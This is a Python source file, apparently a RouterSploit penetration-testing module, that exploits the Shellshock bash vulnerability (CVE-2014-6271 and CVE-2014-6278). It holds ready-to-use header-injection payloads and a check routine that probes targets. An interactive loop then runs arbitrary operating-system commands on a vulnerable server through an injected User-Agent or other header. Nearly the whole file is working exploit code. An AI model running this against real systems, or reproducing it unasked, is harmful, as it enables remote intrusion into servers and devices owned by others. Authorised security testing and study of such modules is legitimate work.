import re
import string

from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Shellshock vulnerability.
    If the target is vulnerable it allows to execute command on operating system level.
    """
    __info__ = {
        'name': 'Shellshock',
        'description': 'Exploits shellshock vulnerability that allows executing commands on operating system level.',
        'authors': [
            'Marcin Bury <marcin.bury@reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://access.redhat.com/articles/1200223',
            'http://seclists.org/oss-sec/2014/q3/649',
            'http://blog.trendmicro.com/trendlabs-security-intelligence/shell-attack-on-your-server-bash-bug-cve-2014-7169-and-cve-2014-6271/',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    path = exploits.Option('/', 'Url path')
    method = exploits.Option('GET', 'HTTP method')
    header = exploits.Option('User-Agent', 'HTTP header injection point')

    payloads = [
        '() { :;};echo -e "\\r\\n{{marker}}$(/bin/bash -c "{{cmd}}"){{marker}}"',  # cve-2014-6271
        '() { _; } >_[$($())] { echo -e "\\r\\n{{marker}}$(/bin/bash -c "{{cmd}}"){{marker}}"; }',  # cve-2014-6278
    ]
    valid = None

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        marker = random_text(32)

        url = "{}:{}{}".format(self.target, self.port, self.path)
        injection = self.valid.replace("{{marker}}", marker).replace("{{cmd}}", cmd)

        headers = {
            self.header: injection,
        }

        response = http_request(method=self.method, url=url, headers=headers)
        if response is None:
            return

        regexp = "{}(.+?){}".format(marker, marker)
        res = re.findall(regexp, response.text, re.DOTALL)

        if len(res):
            return res[0]
        else:
            return ""

    @mute
    def check(self):
        number = int(random_text(6, alph=string.digits))
        solution = number - 1
        cmd = "echo $(({}-1))".format(number)

        marker = random_text(32)
        url = "{}:{}{}".format(self.target, self.port, self.path)

        for payload in self.payloads:
            injection = payload.replace("{{marker}}", marker).replace("{{cmd}}", cmd)

            headers = {
                self.header: injection,
            }

            response = http_request(method=self.method, url=url, headers=headers)
            if response is None:
                continue

            if str(solution) in response.text:
                self.valid = payload
                return True  # target is vulnerable

        return False  # target not vulnerable
